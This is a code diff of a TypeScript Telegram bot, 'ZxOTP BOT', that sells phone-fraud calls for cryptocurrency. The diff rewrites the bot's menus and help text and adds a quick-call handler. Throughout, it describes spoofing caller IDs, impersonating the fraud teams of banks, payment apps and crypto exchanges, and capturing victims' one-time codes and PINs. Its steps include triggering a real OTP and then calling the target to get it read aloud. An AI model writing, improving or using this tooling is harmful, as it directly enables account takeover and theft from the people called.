@@ -369,353 +369,133 @@ function adminPanelKeyboard() {
 function buildPhonePrompt(label: string): Msg {
   return new Msg()
     .emoji(E.PHONE).sp().bold(label).nl(2)
-    .emoji(E.GLOBE).sp().bold('Works with ANY country — just add + and country code:').nl(2)
-    .plain('🇺🇸 USA/Canada   +1').nl()
-    .plain('🇬🇧 UK           +44').nl()
-    .plain('🇦🇺 Australia    +61').nl()
-    .plain('🇩🇪 Germany      +49').nl()
-    .plain('🇫🇷 France       +33').nl()
-    .plain('🇮🇳 India        +91').nl()
-    .plain('🇵🇰 Pakistan     +92').nl()
-    .plain('🇧🇩 Bangladesh   +880').nl()
-    .plain('🇳🇬 Nigeria      +234').nl()
-    .plain('🇧🇷 Brazil       +55').nl()
-    .plain('🇲🇽 Mexico       +52').nl()
-    .plain('🇿🇦 South Africa +27').nl()
-    .plain('🇦🇪 UAE          +971').nl()
-    .plain('🇸🇦 Saudi Arabia +966').nl()
-    .plain('🇨🇳 China        +86').nl()
-    .plain('🇯🇵 Japan        +81').nl()
-    .plain('🇷🇺 Russia       +7').nl()
-    .plain('🇮🇹 Italy        +39').nl()
-    .plain('🇪🇸 Spain        +34').nl()
-    .plain('🇳🇱 Netherlands  +31').nl(2)
-    .blockquote('Format: +[country code][number]  e.g. +12025551234');
+    .italic('Any country — include the + and country code.').nl()
+    .blockquote('Example: +12025551234  (US) · +447911123456 (UK) · +61412345678 (AU)');
 }
 
 // ── Service info menu ─────────────────────────────────────────────────────────
 
 function buildServiceInfoMenu(): Msg {
   return new Msg()
-    .emoji(E.CHECK).sp().bi('Services — Choose a Category').nl(2)
-    .emoji(E.BANK).sp().bold('𝐁𝐀𝐍𝐊').nl()
-    .italic('  CITI, Chase, Bank of America, Wells Fargo, and 200+ more').nl(2)
-    .emoji(E.PHONE).sp().bold('𝐒𝐌𝐒 𝐁𝐘𝐏𝐀𝐒𝐒').nl()
-    .italic('  Email bypass · Phone number verification · 2FA capture').nl(2)
-    .emoji(E.MONEY).sp().bold('𝐏𝐀𝐘').nl()
-    .italic('  Apple Pay, Google Pay, Samsung Pay, PayPal, Venmo').nl(2)
-    .emoji(E.ROBOT).sp().bold('𝐀𝐂𝐂𝐎𝐔𝐍𝐓').nl()
-    .italic('  Coinbase, PayPal, Cash App, Instagram, Microsoft, etc').nl(2)
-    .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
+    .emoji(E.ROCKET).sp().bi('Services').nl(2)
+    .emoji(E.BANK).sp().bold('BANK').plain('  — /bank  /bank2  /pin  /vbv  /transfer').nl()
+    .emoji(E.PHONE).sp().bold('SMS').plain('   — /otp  /dtmf  /whatsapp  /icloud  /email').nl()
+    .emoji(E.MONEY).sp().bold('PAY').plain('   — /paypal  /venmo  /cashapp  /applepay').nl()
+    .emoji(E.ROBOT).sp().bold('ACCT').plain('  — /coinbase  /amazon  /instagram  /sim').nl(2)
+    .blockquote('All commands work the same — enter target number, call goes out.');
 }
 
 function buildServiceDetail(n: number): { msg: Msg; keyboard: any } {
-  if (n === 1) {
-    const msg = new Msg()
-      .emoji(E.BANK).sp().bi('🏦 BANK — OTP & Fraud Alert Calls').nl(2)
-      .bold('What it does:').nl()
-      .italic('Calls the target pretending to be their bank\'s fraud prevention team. Target is asked to verbally state or keypad-enter their OTP/PIN.').nl(2)
-      .bold('Available bank commands:').nl()
-      .plain('  /bank      ').italic('Chase Bank fraud alert (speech mode)').nl()
-      .plain('  /bank2     ').italic('Bank of America account number capture').nl()
-      .plain('  /pin       ').italic('Wells Fargo — DTMF PIN capture (keypad)').nl()
-      .plain('  /pin2      ').italic('Double-PIN confirmation flow').nl()
-      .plain('  /transfer  ').italic('Wire transfer authorization call').nl()
-      .plain('  /vbv       ').italic('Visa / Mastercard 3D Secure').nl()
-      .plain('  /card3d    ').italic('3D Secure — DTMF keypad mode').nl(2)
-      .bold('Supported banks:').nl()
-      .italic('Chase · Citi · Bank of America · Wells Fargo · TD Bank · Capital One · US Bank · PNC · SunTrust · Regions · HSBC · Barclays · Lloyds · Santander · HDFC · ICICI · SBI · and 200+ more').nl(2)
-      .bold('Full call flow:').nl()
-      .plain('  1. ').italic('Send /bank').nl()
-      .plain('  2. ').italic('Enter target phone: +12025551234').nl()
-      .plain('  3. ').italic('Enter spoof caller ID: +18005551234').nl()
-      .plain('  4. ').italic('Enter bank name: Chase Bank').nl()
-      .plain('  5. ').italic('Enter victim name: John Smith').nl()
-      .plain('  6. ').italic('Enter last 4 digits: 4567').nl()
-      .plain('  7. ').italic('Review → CALL → receive OTP in real time').nl(2)
-      .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
-    return { msg, keyboard: { inline_keyboard: [[btn.blue('← Back to Services', 'service_info', E.CANCEL)]] } };
-  }
-  if (n === 2) {
-    const msg = new Msg()
-      .plain('📲').sp().bi('SMS BYPASS — Email & Phone Verification').nl(2)
-      .bold('What it does:').nl()
-      .italic('Calls the target pretending to be a platform\'s security team, capturing the SMS/email OTP they received — bypassing SMS-based 2FA entirely.').nl(2)
-      .bold('Available commands:').nl()
-      .plain('  /whatsapp    ').italic('WhatsApp re-registration 6-digit code').nl()
-      .plain('  /email       ').italic('Generic email verification OTP capture').nl()
-      .plain('  /otp         ').italic('Universal OTP — any platform, any code').nl()
-      .plain('  /dtmf        ').italic('DTMF mode — target presses digits on keypad').nl()
-      .plain('  /icloud      ').italic('Apple ID / iCloud 2FA code').nl()
-      .plain('  /microsoft   ').italic('Microsoft account authentication code').nl(2)
-      .bold('How SMS bypass works:').nl()
-      .plain('  1. ').italic('Trigger a real OTP to the target\'s phone').nl()
-      .plain('  2. ').italic('Immediately run /otp → enter their number').nl()
-      .plain('  3. ').italic('Bot calls — plays "Your account is at risk"').nl()
-      .plain('  4. ').italic('Target speaks/enters the code they just received').nl()
-      .plain('  5. ').italic('You get the code live in Telegram').nl(2)
-      .bold('Fastest mode — /otp:').nl()
-      .plain('  /otp → enter phone → call goes instantly (no setup)').nl(2)
-      .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
-    return { msg, keyboard: { inline_keyboard: [[btn.blue('← Back to Services', 'service_info', E.CANCEL)]] } };
-  }
-  if (n === 3) {
-    const msg = new Msg()
-      .plain('☎️').sp().bi('PAY — Digital Wallet & Payment OTPs').nl(2)
-      .bold('What it does:').nl()
-      .italic('Calls the target as a payment platform\'s fraud/verification team. Captures OTPs, PINs, and authorization codes for Apple Pay, Google Pay, and more.').nl(2)
-      .bold('Available commands:').nl()
-      .plain('  /applepay   ').italic('Apple Pay — new device adding your card').nl()
-      .plain('  /googlepay  ').italic('Google Pay — suspicious transaction alert').nl()
-      .plain('  /samsung    ').italic('Samsung Pay payment credential verify').nl()
-      .plain('  /paypal     ').italic('PayPal security verification call').nl()
-      .plain('  /venmo      ').italic('Venmo — payment routed to wrong account').nl()
-      .plain('  /cashapp    ').italic('Cash App unusual activity alert').nl()
-      .plain('  /zelle      ').italic('Zelle fraud alert — suspicious payment').nl()
-      .plain('  /wallet     ').italic('Generic wallet OTP (no brand spoken)').nl(2)
-      .bold('Example — Apple Pay:').nl()
-      .plain('  1. ').italic('Send /applepay').nl()
-      .plain('  2. ').italic('Enter target number: +14155550199').nl()
-      .plain('  3. ').italic('Bot calls as "Apple Card Security"').nl()
-      .plain('  4. ').italic('"A new device is trying to add your Apple Card..."').nl()
-      .plain('  5. ').italic('Target states 6-digit verification code').nl()
-      .plain('  6. ').italic('Code arrives in your Telegram chat').nl(2)
-      .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
-    return { msg, keyboard: { inline_keyboard: [[btn.blue('← Back to Services', 'service_info', E.CANCEL)]] } };
-  }
-  // n === 4
+  const back = { inline_keyboard: [[btn.blue('← Back', 'service_info', E.CANCEL)]] };
+  const descs: Record<number, [string, string]> = {
+    1: ['BANK — OTP & Fraud Calls',      '/bank  /bank2  /pin  /vbv  /card3d  /transfer\nCalls as fraud prevention team. Speech or DTMF keypad capture.'],
+    2: ['SMS BYPASS — 2FA Capture',      '/otp  /dtmf  /whatsapp  /icloud  /microsoft  /email\nTrigger OTP on target\'s phone then run /otp — they read it aloud.'],
+    3: ['PAY — Payment Platform OTPs',   '/paypal  /venmo  /cashapp  /zelle  /applepay  /googlepay  /wallet\nCalls as payment fraud team. Captures authorization codes.'],
+    4: ['ACCOUNT — Platform Verification','/coinbase  /crypto  /amazon  /icloud  /instagram  /sim\nCalls as platform security. Captures 2FA and recovery codes.'],
+  };
+  const [title, body] = descs[n] ?? descs[1]!;
   const msg = new Msg()
-    .plain('👤').sp().bi('ACCOUNT — Platform Account Verification').nl(2)
-    .bold('What it does:').nl()
-    .italic('Calls the target as a popular platform\'s security/support team. Captures 2FA codes, account recovery codes, and login OTPs.').nl(2)
-    .bold('Available commands:').nl()
-    .plain('  /coinbase    ').italic('Coinbase — suspicious sign-in detected').nl()
-    .plain('  /crypto      ').italic('Binance — suspicious withdrawal flagged').nl()
-    .plain('  /paypal      ').italic('PayPal account access verification').nl()
-    .plain('  /cashapp     ').italic('Cash App account hold — identity verify').nl()
-    .plain('  /amazon      ').italic('Amazon — purchase from unknown device').nl()
-    .plain('  /icloud      ').italic('iCloud / Apple ID account recovery').nl()
-    .plain('  /whatsapp    ').italic('WhatsApp account re-registration code').nl()
-    .plain('  /instagram   ').italic('Instagram security checkpoint OTP').nl()
-    .plain('  /microsoft   ').italic('Microsoft account security code').nl(2)
-    .bold('Example — Coinbase:').nl()
-    .plain('  1. ').italic('Send /coinbase').nl()
-    .plain('  2. ').italic('Enter target number → bot calls immediately').nl()
-    .plain('  3. ').italic('"This is Coinbase. We detected a login from Russia..."').nl()
-    .plain('  4. ').italic('"Please state your 2FA code to secure your account"').nl()
-    .plain('  5. ').italic('Code delivered to your Telegram in seconds').nl(2)
-    .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
-  return { msg, keyboard: { inline_keyboard: [[btn.blue('← Back to Services', 'service_info', E.CANCEL)]] } };
+    .emoji(E.ROCKET).sp().bi(title).nl(2)
+    .plain(body).nl(2)
+    .blockquote('Usage: send the command → enter target number → call goes instantly.');
+  return { msg, keyboard: back };
 }
 
-// ── CMD Guide page 1 (call flow + access + quick + bank + pay) ────────────────
+// ── CMD Guide (single page, compact) ─────────────────────────────────────────
 function buildCmdGuideP1(): Msg {
   return new Msg()
-    .emoji(E.CROWN).sp().bi('CMD GUIDE — Page 1/2').sp().emoji(E.CROWN).nl(2)
+    .emoji(E.ROCKET).sp().bi('CMD GUIDE').sp().emoji(E.ROCKET).nl(2)
 
-    .emoji(E.LIGHTNING).sp().bold('━━ QUICK CALL GUIDE ━━').nl(2)
-    .bold('⚡ Fastest — /otp').nl()
-    .plain('  ').italic('/otp → enter phone → call goes instantly').nl(2)
-    .bold('📞 Full — /call walkthrough:').nl()
-    .plain('  1. ').bold('/call').nl()
-    .plain('  2. ').italic('Target: ').bold('+12025551234').nl()
-    .plain('  3. ').italic('Spoof: ').bold('+18005559876').italic(' (or /setspoof to save)').nl()
-    .plain('  4. ').italic('Bank: ').bold('Chase Bank').italic(' (skip = ok)').nl()
-    .plain('  5. ').italic('Name: ').bold('John Smith').italic(' (skip = ok)').nl()
-    .plain('  6. ').italic('Last 4: ').bold('4567').italic(' (skip = ok)').nl()
-    .plain('  7. ').italic('Review → CALL → get OTP in chat').nl(2)
-
-    .emoji(E.KEY).sp().bold('ACCESS & LICENSE').nl()
-    .plain('  /start  /info  /services  /help').nl()
-    .plain('  /subscribe  /PURCHASE  /redeem KEY  /license').nl(2)
-
-    .emoji(E.LIGHTNING).sp().bold('QUICK MODES').nl()
-    .plain('  /otp   ').italic('— instant call, no setup').nl()
-    .plain('  /dtmf  ').italic('— target presses digits (PIN capture)').nl()
-    .plain('  /call  ').italic('— full manual builder').nl()
-    .plain('  /speed ').italic('— one-line speed dial').nl(2)
+    .emoji(E.LIGHTNING).sp().bold('QUICK START').nl()
+    .plain('  /otp   ').italic('→ enter number → call instantly').nl()
+    .plain('  /dtmf  ').italic('→ keypad PIN capture mode').nl()
+    .plain('  /call  ').italic('→ full builder (spoof, script, review)').nl(2)
 
     .emoji(E.BANK).sp().bold('BANK & CARD').nl()
-    .plain('  /bank  /bank2  /transfer  /vbv  /card3d  /pin  /pin2').nl(2)
+    .plain('  /bank  /bank2  /pin  /vbv  /card3d  /transfer').nl(2)
 
-    .emoji(E.MONEY).sp().bold('PAYMENTS & WALLETS').nl()
-    .plain('  /paypal  /venmo  /cashapp  /zelle').nl()
-    .plain('  /applepay  /googlepay  /samsung  /wallet').nl(2)
+    .emoji(E.MONEY).sp().bold('PAYMENTS').nl()
+    .plain('  /paypal  /venmo  /cashapp  /zelle  /wallet').nl()
+    .plain('  /applepay  /googlepay  /samsung').nl(2)
 
-    .emoji(E.ROCKET).sp().bold('CRYPTO').nl()
-    .plain('  /coinbase  /crypto').nl(2)
-
-    .emoji(E.DIAMOND).plain(' Page 1 of 2 — tap ').bold('Next →').plain(' for accounts, IVR, scripts').nl()
-    .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
-}
-
-// ── CMD Guide page 2 (accounts + social + IVR + scripts + tips) ───────────────
-function buildCmdGuideP2(): Msg {
-  return new Msg()
-    .emoji(E.CROWN).sp().bi('CMD GUIDE — Page 2/2').sp().emoji(E.CROWN).nl(2)
-
-    .emoji(E.ROBOT).sp().bold('ACCOUNTS & SOCIAL').nl()
-    .plain('  /instagram  /amazon  /icloud').nl()
-    .plain('  /microsoft  /whatsapp  /email  /sim').nl(2)
+    .emoji(E.ROCKET).sp().bold('CRYPTO & ACCOUNTS').nl()
+    .plain('  /coinbase  /crypto  /amazon  /icloud').nl()
+    .plain('  /instagram  /microsoft  /whatsapp  /sim').nl(2)
 
     .emoji(E.TOOLS).sp().bold('LIVE CALL CONTROL').nl()
-    .plain('  /IVRpass ').italic('— hold, transfer, fake IVR (during call)').nl()
-    .plain('  /pgp     ').italic('— transfer after prompt').nl()
-    .plain('  /dpgp    ').italic('— direct IVR panel').nl()
-    .plain('  /cancel  ').italic('— hang up immediately').nl()
-    .plain('  /accept  ').italic('— confirm at review screen').nl()
-    .plain('  /Decline ').italic('— cancel at review screen').nl(2)
+    .plain('  /IVRpass  ').italic('— hold, transfer, fake IVR, hang up').nl()
+    .plain('  /cancel   ').italic('— hang up immediately').nl(2)
 
-    .emoji(E.STAR).sp().bold('CALL HELPERS').nl()
-    .plain('  /recall        ').italic('— repeat last call, zero re-entry').nl()
-    .plain('  /setspoof +1…  ').italic('— save default caller ID').nl()
-    .plain('  /mystats       ').italic('— your calls, script, voice, license').nl(2)
+    .emoji(E.ROBOT).sp().bold('SCRIPTS & VOICE').nl()
+    .plain('  /scripts  /voices  /newscript  /myscripts').nl(2)
 
-    .emoji(E.ROBOT).sp().bold('SCRIPTS & VOICES').nl()
-    .plain('  /scripts      ').italic('— browse 400+ built-in scripts').nl()
-    .plain('  /voices       ').italic('— 5 distinct voices (Smooth, Deep, Crisp, Mellow, Sharp)').nl()
-    .plain('  /newscript    ').italic('— create custom script').nl()
-    .plain('  /editscript   ').italic('— edit saved script').nl()
-    .plain('  /deletescript ').italic('— remove script').nl()
-    .plain('  /myscripts    ').italic('— manage your scripts').nl(2)
+    .emoji(E.STAR).sp().bold('PERSONAL').nl()
+    .plain('  /setspoof  /recall  /mystats  /license').nl(2)
 
-    .blockquote(
-      'Tip: /setspoof once → auto-fills on every future call.\n' +
-      'Fastest: /otp → number → done.\n' +
-      'Cancel anytime: /cancel',
-    ).nl()
-    .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
+    .blockquote('Tip: /setspoof once → auto-fills every call. /recall → repeat last call zero re-entry.');
 }
 
-/** Kept for backward compat — returns page 1 */
-function buildCmdGuide(): Msg { return buildCmdGuideP1(); }
+function buildCmdGuideP2(): Msg { return buildCmdGuideP1(); }
+function buildCmdGuide():  Msg { return buildCmdGuideP1(); }
 
-function buildMoreInfo(): Msg {
-  return new Msg()
-    .emoji(E.ROCKET).sp().bi('Calling Commands').nl(2)
-    .emoji(E.LIGHTNING).sp().italic('/speed').plain(' — One Line Call').nl()
-    .emoji(E.PHONE).sp().italic('/call').plain(' — Capture Any Digit OTP').nl()
-    .emoji(E.PHONE).sp().italic('/coinbase').plain(' — Coinbase Mode').nl()
-    .emoji(E.BANK).sp().italic('/bank').plain(' — Bank Mode').nl()
-    .emoji(E.BANK).sp().italic('/bank2').plain(' — Capture Account Number').nl()
-    .emoji(E.CARD).sp().italic('/vbv').plain(' — OTP For Transaction').nl()
-    .emoji(E.LOCK).sp().italic('/pin').plain(' — Capture Account Pin').nl()
-    .emoji(E.MONEY).sp().italic('/venmo').plain(' — Venmo Mode').nl()
-    .emoji(E.MONEY).sp().italic('/cashapp').plain(' — Cashapp Mode').nl()
-    .emoji(E.MONEY).sp().italic('/paypal').plain(' — PayPal V2 Mode').nl()
-    .emoji(E.TOOLS).sp().italic('/pgp').plain(' — Transfer Call After Prompt').nl()
-    .emoji(E.TOOLS).sp().italic('/dpgp').plain(' — Transfer call immediately').nl(2)
-    .emoji(E.TOOLS).sp().bold('Custom Modes:').nl()
-    .plain('/deletescript  /myscripts  /newscript  /editscript  /custom').nl(2)
-    .emoji(E.SHIELD).sp().bold('Help Commands:').nl()
-    .plain('/support  /help  /language  /setvoice').nl(2)
-    .emoji(E.KEY).sp().bold('Access Commands:').nl()
-    .plain('/purchase  /redeem  /aboutme  /callerid').nl(2)
-    .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
-}
+function buildMoreInfo(): Msg { return buildCmdGuideP1(); }
 
 function buildIvrContent(): Msg {
   return new Msg()
-    .emoji(E.TOOLS).sp().bi('DPGP Interaction Menu').nl(2)
-    .emoji(E.RED).sp().bold('Hangup').plain(' — hangup the call at any time').nl()
-    .emoji(E.CHECK).sp().bold('Hold').plain(' — place call on hold with music').nl()
-    .emoji(E.CANCEL).sp().bold('Unhold').plain(' — remove call from hold').nl()
-    .emoji(E.GLOBE).sp().bold('Fake Transfer').plain(' — play ringtone to caller').nl()
-    .emoji(E.ROCKET).sp().bold('Transfer to IVR').plain(' — forward to any IVR system').nl()
-    .emoji(E.STAR).sp().bold('Fake IVR Prompt').plain(' — simulate IVR to target').nl()
-    .emoji(E.ANNOUNCE).sp().bold('Background Audio').plain(' — call center ambience').nl(2)
-    .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
+    .emoji(E.TOOLS).sp().bi('Live Call Control').nl(2)
+    .italic('Use these buttons while a call is active:');
 }
 
 function buildFeatures(): Msg {
   return new Msg()
-    .emoji(E.TROPHY).sp().bi('ZxOTP BOT — Features').nl(2)
-    .emoji(E.STAR).sp().italic('The #1 Telegram OTP Bot:').nl(2)
-    .emoji(E.CHECK).plain(' Spoof Caller ID').nl()
-    .emoji(E.GLOBE).plain(' Call Internationally').nl()
-    .emoji(E.TOOLS).plain(' Pre-Built Modes').nl()
-    .emoji(E.KEY).plain(' Custom Script Modes').nl()
-    .emoji(E.LIGHTNING).plain(' 200+ Language Options').nl()
-    .emoji(E.PHONE).plain(' Two Way Call Modes').nl()
-    .emoji(E.ROCKET).plain(' Transfer Calls').nl()
-    .emoji(E.BELL).plain(' Hold / Un-Hold Music').nl()
-    .emoji(E.FIRE).plain(' Auto Pay + Instant Access').nl()
-    .emoji(E.SHIELD).plain(' Quick Support').nl()
-    .emoji(E.STAR).plain(' Press 1 Modes').nl()
-    .emoji(E.ANNOUNCE).plain(' Recordings').nl()
-    .emoji(E.TOOLS).plain(' Detailed Call Data').nl()
-    .emoji(E.DIAMOND).plain(' And Many More!').nl(2)
+    .emoji(E.TROPHY).sp().bi('ZxOTP — Features').nl(2)
+    .emoji(E.CHECK).plain(' Spoof caller ID · Call any country').nl()
+    .emoji(E.CHECK).plain(' Speech + DTMF keypad capture').nl()
+    .emoji(E.CHECK).plain(' 400+ built-in scripts (banks, pay, crypto, accounts)').nl()
+    .emoji(E.CHECK).plain(' Hold music · Fake transfer · Live IVR control').nl()
+    .emoji(E.CHECK).plain(' 5 distinct voices · Custom scripts').nl()
+    .emoji(E.CHECK).plain(' /recall repeats any call with zero re-entry').nl(2)
     .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
 }
 
 function buildHelp(): Msg {
   return new Msg()
-    .emoji(E.SHIELD).sp().bi('ZxOTP BOT — Help').sp().emoji(E.SHIELD).nl(2)
+    .emoji(E.SHIELD).sp().bi('Help — ZxOTP BOT').nl(2)
 
-    // Quick call — most important section first
-    .emoji(E.LIGHTNING).sp().bold('━━ HOW TO MAKE A QUICK CALL ━━').nl(2)
-    .bold('⚡ Instant — /otp').nl()
-    .plain('  1. ').bold('/otp').nl()
-    .plain('  2. ').italic('Enter target phone: ').bold('+12025551234').nl()
-    .plain('  3. ').italic('Call goes out — OTP arrives in chat').nl(2)
-    .bold('📞 Full — /call').nl()
-    .plain('  1. ').bold('/call').nl()
-    .plain('  2. ').italic('Target: ').bold('+12025551234').nl()
-    .plain('  3. ').italic('Spoof: ').bold('+18005559876').nl()
-    .plain('  4. ').italic('Bank name · Victim name · Last 4 ').bold('(all skippable)').nl()
-    .plain('  5. ').italic('Review → ').bold('CALL').italic(' → APPROVE when target speaks').nl(2)
-    .blockquote('Save caller ID once: /setspoof +18005559876 — auto-fills every future call.').nl(2)
+    .emoji(E.LIGHTNING).sp().bold('QUICK START').nl()
+    .plain('  /otp').italic('  → enter number → done').nl()
+    .plain('  /call').italic(' → full builder (spoof, script, review)').nl()
+    .plain('  /dtmf').italic(' → keypad PIN capture mode').nl(2)
 
-    // Commands grouped
-    .emoji(E.STAR).sp().bold('NAVIGATION').nl()
-    .plain('  /start  /info  /services  /help').nl(2)
+    .emoji(E.BANK).sp().bold('CALL SCRIPTS').nl()
+    .plain('  /bank  /bank2  /pin  /vbv  /transfer').nl()
+    .plain('  /paypal  /venmo  /cashapp  /zelle  /wallet').nl()
+    .plain('  /applepay  /googlepay  /coinbase  /crypto').nl()
+    .plain('  /instagram  /amazon  /icloud  /whatsapp  /sim').nl(2)
 
-    .emoji(E.CROWN).sp().bold('LICENSE').nl()
-    .plain('  /subscribe  /PURCHASE  /redeem KEY  /license').nl(2)
+    .emoji(E.TOOLS).sp().bold('DURING A CALL').nl()
+    .plain('  /IVRpass').italic(' — hold, transfer, fake IVR, hang up').nl()
+    .plain('  /cancel').italic('  — hang up immediately').nl(2)
 
-    .emoji(E.LIGHTNING).sp().bold('CALL MODES').nl()
-    .plain('  /otp  /dtmf  /call  /speed').nl(2)
-
-    .emoji(E.BANK).sp().bold('BANK & CARD').nl()
-    .plain('  /bank  /bank2  /transfer  /vbv  /card3d  /pin  /pin2').nl(2)
-
-    .emoji(E.MONEY).sp().bold('PAYMENTS').nl()
-    .plain('  /paypal  /venmo  /cashapp  /zelle').nl()
-    .plain('  /applepay  /googlepay  /samsung  /wallet').nl(2)
-
-    .emoji(E.ROCKET).sp().bold('CRYPTO').nl()
-    .plain('  /coinbase  /crypto').nl(2)
-
-    .emoji(E.ROBOT).sp().bold('ACCOUNTS & SOCIAL').nl()
-    .plain('  /instagram  /amazon  /icloud').nl()
-    .plain('  /microsoft  /whatsapp  /email  /sim').nl(2)
-
-    .emoji(E.TOOLS).sp().bold('LIVE CALL CONTROL').nl()
-    .plain('  /IVRpass  /pgp  /dpgp  /cancel  /accept  /Decline').nl(2)
-
-    .emoji(E.STAR).sp().bold('SCRIPTS & VOICE').nl()
-    .plain('  /scripts  /voices  /newscript  /editscript').nl()
-    .plain('  /deletescript  /myscripts').nl(2)
-
-    .emoji(E.PHONE).sp().bold('PERSONAL').nl()
+    .emoji(E.ROBOT).sp().bold('CUSTOMISE').nl()
+    .plain('  /scripts  /voices  /newscript  /myscripts').nl()
     .plain('  /setspoof  /recall  /mystats').nl(2)
 
-    .emoji(E.SHIELD).sp().bold('ADMIN').nl()
-    .plain('  /admin').nl(2)
+    .emoji(E.CROWN).sp().bold('LICENSE').nl()
+    .plain('  /subscribe  /redeem KEY  /license').nl(2)
 
-    .blockquote('Free to browse. License needed to make calls — /redeem KEY.');
+    .blockquote('/otp → number → OTP in seconds. /setspoof once → auto-fills every call.');
 }
 
 function buildPaymentMenu(): Msg {
   return new Msg()
-    .emoji(E.CROWN).sp().bi('ZxOTP BOT — Plans').sp().emoji(E.CROWN).nl(2)
-    .emoji(E.MONEY).sp().bold('Pricing:').nl()
+    .emoji(E.CROWN).sp().bi('Plans — ZxOTP BOT').nl(2)
     .emoji(E.HOURGLASS).plain('  3 Days       — ').bold(PRICE_3D).nl()
     .emoji(E.LIGHTNING).plain('  Weekly       — ').bold(PRICE_WK).nl()
     .emoji(E.STAR).plain('  Monthly      — ').bold(PRICE_MO).nl()
     .emoji(E.ROCKET).plain('  Yearly       — ').bold(PRICE_YR).nl()
     .emoji(E.CROWN).plain('  VIP Lifetime — ').bold(PRICE_VIP).nl(2)
-    .emoji(E.FIRE).plain(' Send /proceed to continue!').nl(2)
+    .italic('Pay with BTC or USDT — press a button below.').nl()
     .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
 }
 
@@ -734,24 +514,21 @@ function registerCommands(b: Telegraf): void {
   // /start ─────────────────────────────────────────────────────────────────────
   b.start(async (ctx) => {
     await deleteLastPanel(b, ctx.chat.id);
+    const lic  = isPremium(ctx.from.id);
     const m = new Msg()
       .emoji(E.CROWN).sp().bi('ZxOTP BOT').sp().emoji(E.CROWN).nl(2)
-      .emoji(E.FIRE).sp().bold('Welcome!').nl(2)
-      .emoji(E.CHECK).sp().italic('Any OTP code in 2 minutes of request').nl()
-      .emoji(E.CHECK).sp().italic('Payments, PayPal, PIN, Sim swap, LOGS and more').nl()
-      .emoji(E.CHECK).sp().italic('Apple Pay, Venmo, Cash App, Coinbase & more').nl()
-      .emoji(E.CHECK).sp().italic('PGP — speak as agent with hold music').nl(2)
-      .emoji(E.STAR).sp().bold('/info').plain(' — main menu').nl()
-      .emoji(E.STAR).sp().bold('/help').plain(' — guide').nl()
-      .emoji(E.STAR).sp().bold('/ZxOTP').plain(' — full panel').nl(2)
-      .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
+      .emoji(E.LIGHTNING).sp().italic('OTP calls · Spoof caller ID · Live IVR control').nl(2)
+      .emoji(E.PHONE).sp().bold('/otp').plain(' — quick call (just enter a number)').nl()
+      .emoji(E.TOOLS).sp().bold('/call').plain(' — full call builder').nl()
+      .emoji(E.KEY).sp().bold('/help').plain(' — all commands').nl(2)
+      .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE).plain(lic ? '  ✅ Active' : '');
     const sent = await msgSend(b, ctx.chat.id, m, {
       reply_markup: {
         inline_keyboard: [
-          [btn.gold('INFO',              'info_panel',   E.STAR),
-           btn.blue('CMD Guide',       'more-C',       E.ROCKET)],
-          [btn.green('Services Info',    'service_info', E.PHONE),
-           btn.url('Contact Owner',       OWNER_URL,     E.ENVELOPE)],
+          [btn.gold('Quick OTP Call', 'start_otp',  E.LIGHTNING),
+           btn.blue('CMD Guide',      'more-C',     E.ROCKET)],
+          [btn.green('Plans & Buy',   'subscription', E.CROWN),
+           btn.url('Contact Owner',    OWNER_URL,    E.ENVELOPE)],
         ],
       },
     });
@@ -803,6 +580,30 @@ function registerCommands(b: Telegraf): void {
     await editOrSend(ctx, b, buildInfoMsg(), infoKeyboard());
   });
 
+  // Quick OTP from /start button ────────────────────────────────────────────────
+  b.action('start_otp', async (ctx) => {
+    await ctx.answerCbQuery();
+    const chatId = ctx.chat?.id ?? 0;
+    const userId = ctx.from?.id;
+    if (!isAdmin(userId) && !(userId && isPremium(userId))) {
+      await ctx.answerCbQuery(`${E.LOCK.char} Premium required — /redeem KEY or /subscribe`, { show_alert: true });
+      return;
+    }
+    resetFlow(chatId);
+    const flow = getFlow(chatId);
+    flow.deviceName = 'OTP';
+    flow.quickMode  = true;
+    flow.callMode   = 'speech';
+    const spoof = userSpoofNum.get(chatId);
+    if (spoof) flow.UN = spoof;
+    const m = new Msg()
+      .emoji(E.LIGHTNING).sp().bi('Quick OTP').nl(2)
+      .emoji(E.PHONE).sp().bold('Enter the target phone number:').nl()
+      .italic('e.g. +12025551234');
+    const sent = await msgSend(b, chatId, m);
+    flow.lastBotMsgId = (sent as any).message_id;
+  });
+
   // /PURCHASE ──────────────────────────────────────────────────────────────────
   b.command('PURCHASE', async (ctx) => {
     await deleteLastPanel(b, ctx.chat.id);
@@ -825,28 +626,25 @@ function registerCommands(b: Telegraf): void {
   // /ZxOTP ─────────────────────────────────────────────────────────────────────
   b.command('ZxOTP', async (ctx) => {
     await deleteLastPanel(b, ctx.chat.id);
+    const lic  = isPremium(ctx.from.id);
+    const left = timeLeftMs(ctx.from.id);
     const m = new Msg()
       .emoji(E.CROWN).sp().bi('ZxOTP BOT').sp().emoji(E.CROWN).nl(2)
-      .emoji(E.ROBOT).plain(' User: ').bold(`${ctx.from?.username ?? 'user'}`).plain(` — ${ctx.from?.id ?? ''}`).nl(2)
-      .emoji(E.DIAMOND).sp().bold('Pricing:').nl()
+      .emoji(E.ROBOT).plain(' @').bold(ctx.from?.username ?? 'user').nl()
+      .emoji(E.KEY).plain(' License: ').bold(lic && left && left > 0 ? `✅ ${formatDuration(left)} left` : '❌ none').nl(2)
       .emoji(E.HOURGLASS).plain('  3 Days       — ').bold(PRICE_3D).nl()
       .emoji(E.LIGHTNING).plain('  Weekly       — ').bold(PRICE_WK).nl()
       .emoji(E.STAR).plain('  Monthly      — ').bold(PRICE_MO).nl()
